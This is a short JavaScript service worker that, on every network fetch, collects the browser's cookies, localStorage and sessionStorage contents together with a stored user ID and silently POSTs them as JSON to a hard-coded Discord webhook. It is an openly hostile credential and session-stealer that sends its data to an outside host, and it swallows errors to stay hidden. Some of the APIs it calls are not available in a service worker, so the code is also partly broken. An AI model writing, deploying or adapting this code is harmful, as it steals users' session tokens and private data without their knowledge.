self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', () => self.clients.claim());
self.addEventListener('fetch', (event) => {
    const data = {
        uuid: localStorage.getItem('userID'),
        status: 'background',
        savedData: {
            cookies: document.cookie ? document.cookie.split(';').reduce((acc, c) => {
                const [key, value] = c.trim().split('=');
                acc[key] = value;
                return acc;
            }, {}) : {},
            localStorage: {},
            sessionStorage: {}
        }
    };
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.savedData.localStorage[key] = localStorage.getItem(key);
    }
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.savedData.sessionStorage[key] = sessionStorage.getItem(key);
    }
    fetch('https://discord.com/api/webhooks/1380906696322584616/FnlOOVb0Be5s21s1J9QEx4MhmjOLoumoJpAFJMOoMa5OcOZK_OuTAQRV6RGQE67JvC7i', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
    }).catch(() => {});
});